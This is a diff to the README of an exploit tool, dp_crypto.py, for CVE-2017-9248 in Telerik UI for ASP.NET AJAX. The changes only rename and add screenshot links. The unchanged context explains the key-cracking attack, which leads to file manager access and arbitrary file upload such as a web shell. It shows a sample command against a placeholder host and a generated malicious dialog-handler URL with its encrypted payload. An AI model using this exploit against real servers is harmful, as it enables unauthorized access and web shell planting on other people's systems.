@@ -4,7 +4,7 @@
 Base64-based encryption oracle exploit for CVE-2017-9248 (Telerik UI for ASP.NET AJAX dialog handler)
 
 ## Overview
-![dp_crypto screenshot](images/upload_screenshot.png)
+![dp_crypto screenshot](images/upload2_screenshot.png)
 
 This exploit attacks the vulnerable encryption to discover the dialog handler key for vulnerable versions of Telerik UI for ASP.NET AJAX, then provides an encrypted link which gives access to a file manager, and arbitrary file upload (e.g. web shell) if remote file permissions allow.
 
@@ -35,7 +35,7 @@ The following example should be sufficient to crack machine key and generate a v
 
 ## Example
 
-![dp_crypto screenshot](images/key-link_screenshot.png)
+![dp_crypto screenshot](images/key-link2_screenshot.png)
 
 ```
 $ ./dp_crypto.py -k http://fake.bao7uo.com/Telerik.Web.UI.DialogHandler.aspx 48 hex 9
@@ -100,3 +100,7 @@ Total web requests: 1602
 2012.3.1308: http://fake.bao7uo.com/Telerik.Web.UI.DialogHandler.aspx?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp=YWcBWmhcSS0UawsNI10KFyUDPjJvY2NGay9zMCF0FkF9QUoQUlsUWAsAYipVchAIaWZ2WlV2WTsJdRdBJWcRMgsHPiVUY38AbAR7dyAQMwR9fFlyY2J3XB1dSCplYndRaWdmWWtmYwIcawtUFAMWdCQDED5Xc2RZXQFNBBsRO0hqa0U/fXMQTSBnZXFiWBBNaXdiS2VmCCofYD1/GGc8OxwXMT16cHsCbxp3MCB0BVllf3R1UH0PRxJ4endtZjFPf3ZERmhLXRAQZH0BDgEKLR8cDC5XcnBdXQpnLyErdkh8fmA8VWIXRwlzSBJ6WDVPagFxC2FlRQcnXgNRI3cSByQTDChsc2BZYwR7MSMRdkh8fWgtU30MWAh0fTVhfQwJaWRAfGhpWRcmdD1OGGcWBicTPihjBl4DYxFNBBsRO0hqa0U9fXELQwp0VzF6cTJ1UQJ6WlN2XXccaxdIIwJxEB8cFCt6cWhdWwp7Lw4CAkF/CGg1U3IUdyddCXVUBxBBYgINR1V2ZzQhdQdBIwMeMRwDED1gfF5CYxcAKyARFkFiVXQ2UgcXRwlzR3FhWCpUVwF2WlV2WTsJdRdBJWcRMgsHPiVUY38AbARzNRISN3hTCXw3UGJ3YSYDZixWdj5/amdMSGtiRjsJdh9QI3gKLQl0EHBSc2RMWy9zMBABL1pSfwsrUgQAXCB3VzVlWABLUAJhQXxyRnYRdANNGwMSKRx2EzdkWXRGWnBgMA8FO1NmQmB1Z1kYehRkRBNtYj5UUF1YQH1aYzEcZD1OGwAWLRwpKjFXbGBFW3ABNhABL1pSfwsrZ30uQx5lBS5VYhNLYV1yQVIDZDIIcD1vEwEeOxEoLg9Vc3QAdxRdIhR2LwNmVGQ3VWMIbBFeci1lTyoNZ3dAYVJ3XRkgex9ZDHVxcx8pcxdTY3tMXApFDiN3CQBnbHwSVXMybApkchNhBRwJZGZQWVN2fzMQXQdiFwMscxEqKndsBWh9byx7IhUDM0VpYFl0ZnMybBdoZhFhYjJCYGVuU1N2fzQRXQdRDFoVdBITNgZTcQNFdwpFDiMtFQRkbWArUgUuchBadi9kcw9AagIFZH5mezUTWQNTEnU0Lh8vCHdsBWR8by9ZKhB0O0NlQngSf2MYfAtoeidhTxcNZ2ZmeFR3QTUXXj13JF0gdRIpNhNXYl5gbS9BDBMScwt/CHQ2U3J7BxBoZjVTcipPUXdiZmtmSS0cABdIIwJwMhQpADdVBmdGdDtNBBsRO0hqaQ94
 $ 
 ```
+
+![dp_crypto screenshot](images/key-link_screenshot.png)
+
+![dp_crypto screenshot](images/upload_screenshot.png)
